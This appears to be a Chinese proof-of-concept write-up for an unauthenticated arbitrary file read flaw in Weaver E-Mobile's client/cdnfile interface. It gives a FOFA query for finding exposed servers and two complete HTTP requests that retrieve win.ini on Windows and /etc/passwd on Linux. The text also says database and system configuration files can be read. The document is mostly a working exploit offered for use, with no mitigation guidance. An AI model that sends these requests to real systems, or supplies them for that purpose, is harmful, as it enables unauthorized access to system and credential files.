# 泛微E-Mobile系统接口cdnfile存在任意文件读取漏洞
泛微e-mobile遵循以客户为中心，以企业中的事务为导向的出发点，帮助企业构建以员工为核心的移动统一办公平台。e-mobile可满足企业日常管理中的绝大部分管理需求， 诸如市场销售、项目、采购、研发、客服、财务、人事、行政等；同时e-mobile可帮助企业实现面向不同用户量身定制的移动办公入口，包括企业员工、供应商、代理商、 合作伙伴、投资费以及终端客户等整个供应链条上的关系主体，满足为企业全方位的移动办公需求。泛微e-mobile client/cdnfile 接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。
## fofa

`app="泛微-EMobile"`
***
### windows下执行
```javascript
GET /client/cdnfile/1C/Windows/win.ini HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: close
```
![image](https://github.com/user-attachments/assets/dfc8f838-09ff-4fd5-9bfb-a96058e4cac3)

### linux下执行
```javascript
GET /client/cdnfile/C/etc/passwd HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: close
```
![image](https://github.com/user-attachments/assets/2f7e6688-aa3d-4ed5-81c8-4da7e2865fe2)
